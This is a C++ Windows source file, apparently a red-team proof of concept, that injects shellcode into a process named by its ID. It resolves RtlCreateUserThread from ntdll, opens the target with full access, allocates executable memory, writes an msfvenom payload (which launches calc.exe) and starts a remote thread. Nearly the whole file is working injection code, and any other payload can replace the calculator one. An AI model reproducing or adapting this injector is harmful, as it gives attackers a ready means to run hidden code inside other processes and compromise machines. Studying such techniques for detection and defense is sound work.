#include <cstdio>
#include <Windows.h>
#include "my_ntapi.h"

PRtlCreateUserThread RtlCreateUserThread;

void usage() {
	printf("Usage: RtlCreateUserThread-Injection.exe <ProcessID>\n");
}

int main(int argc, char *argv[])
{
	if (argc != 2) {
		usage();
		return 1;
	}

	// buf is shellcode
	// msfvenom -a x86 EXITFUNC=thread --platform windows -p windows/exec cmd=calc.exe -f c
	unsigned char buf[] =
		"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
		"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
		"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
		"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
		"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
		"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
		"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
		"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
		"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
		"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
		"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5"
		"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
		"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

	DWORD pid = atoi(argv[1]);
	LPVOID lpBuffer;
	HANDLE hProcess, hThread;
	SIZE_T bufsize = sizeof(buf);
	CLIENT_ID cid;
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");

	if (ntdll == NULL) {
		printf("[E] Failed to get ntdll.dll module. Error code = %d\n", GetLastError());
		return 1;
	}

	printf("[*] Get RtlCreateUserThread address...\n");
	RtlCreateUserThread = (PRtlCreateUserThread)GetProcAddress(ntdll, "RtlCreateUserThread");

	if (RtlCreateUserThread == NULL) {
		printf("[E] Failed to get RtlCreateUserThread address. Error code = %d\n", GetLastError());
		return 1;
	}

	printf("[I] RtlCreateUserThread address = 0x%p\n", RtlCreateUserThread);

	printf("[*] OpenProcess with PID %d...\n", pid);
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	if (hProcess == NULL) {
		printf("[E] Failed to open process. Error code = %d\n", GetLastError());
		return 1;
	}

	printf("[*] Allocate virtual memory to remote PID %d process...\n", pid);
	lpBuffer = VirtualAllocEx(hProcess, NULL, bufsize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (lpBuffer == NULL) {
		printf("[E] Failed to allocate. Error code = %d\n", GetLastError());
		return 1;
	}

	printf("[I] Remote base address: 0x%p\n", lpBuffer);

	printf("[*] Write shellcode to the virtual memory...\n");
	if (!WriteProcessMemory(hProcess, lpBuffer, buf, bufsize, NULL)) {
		printf("[E] Failed to write shellcode. Error code = %d\n", GetLastError());
		return 1;
	}

	printf("[*] Execute RtlCreateUserThread...\n");
	RtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, lpBuffer, NULL, &hThread, &cid);

	printf("[*] Done.\n");

	return 0;
}